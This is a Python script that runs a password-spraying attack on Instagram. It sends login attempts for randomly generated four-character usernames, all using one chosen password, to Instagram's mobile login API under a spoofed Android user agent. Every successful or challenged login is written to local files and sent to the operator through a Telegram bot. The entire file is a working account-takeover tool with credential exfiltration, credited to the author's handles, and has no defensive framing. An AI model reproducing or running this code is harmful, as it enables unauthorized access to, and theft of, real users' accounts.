import requests,sys,time,os,random,pyfiglet,colorama,secrets,uuid
from secrets import token_hex
from time import sleep
from uuid import uuid4
uid = uuid.uuid4()
cookie = secrets.token_hex(8) * 2
E = '\033[1;31m'
G = '\033[1;32m'
S = '\033[1;33m'
os.system('clear')
P56 = pyfiglet.figlet_format("Secure User")
def j(z):
    for e in z:
     sys.stdout.write(e) 
     sys.stdout.flush() 
     time.sleep(0.001)
j(S+P56)
print(f"{S}- "*15)
ID=input('\033[0;31m[+] Enter YOUR ID :\033[0;32m ')
print('\n')
tok=input('\033[0;32m[+] Enter TOKEN BOT :\033[0;31m ')
print('\n')
pas=input('[+] PassWord To Check : ')
print(f"{S}- "*15)
user = '1234567890._qwertyuiopasdfghjklzxcvbnm'
while True:
    joker = str("".join(random.choice(user)for i in range(4)))
    username= joker
    password = pas
    if username =='':
        exit()
    if password =='':
        exit()
    cookies = token_hex(8) * 2
    url='https://i.instagram.com/api/v1/accounts/login/'
    headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',
                 'Cookie':'missing',
                 'Accept-Encoding':'gzip, deflate',
                 'Accept-Language':'en-US',
                 'X-IG-Capabilities':'3brTvw==',
                 'X-IG-Connection-Type':'WIFI',
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
              'Host':'i.instagram.com'}
    data = {'uuid':uid,  'password':password,
              'username':username,
              'device_id':uid,
              'from_reg':'false',
              '_csrftoken':'missing',
              'login_attempt_countn':'0'}
    req= requests.post(url, headers=headers, data=data)
    if 'logged_in_user' in req.json():
        with open('4users work.txt', 'a') as (ZZ):
          ZZ.write(f'User 4 available \n {username}:{password} \n')
          print(f'{G}Available USER 4 \n - - - - - - - - - - - - -\n user : {username}\n password : {password} \n - - - - - - - - - - - - -\n By : @H_c_4 - @BBQBBBBB')
          tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=Available USER 4 \n - - - - - - - - - - - - -\n user : {username}\n password : {password} \n - - - - - - - - - - - - -\n By : @H_c_4 - @BBQBBBBB"
        i = requests.post(tlg)
    if '"message":"challenge_required"' in req.text:
        with open('Sec user.txt', 'a') as (SS):
            SS.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
            print(f'{S} E-mail : {username} | PassWord : {password}')
            tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=Secure USER 4 \n - - - - - - - - - - - - -\n user : {username}\n password : {password} \n - - - - - - - - - - - - -\n By : @H_c_4 - @BBQBBBBB"
        i = requests.post(tlg)
    if "'message': 'Please wait a few minutes before you try again.'" in req.json():
          print('Wait')
          sleep(30)
    else:
        print(f'{E} User : {username} <> PassWord : {password}')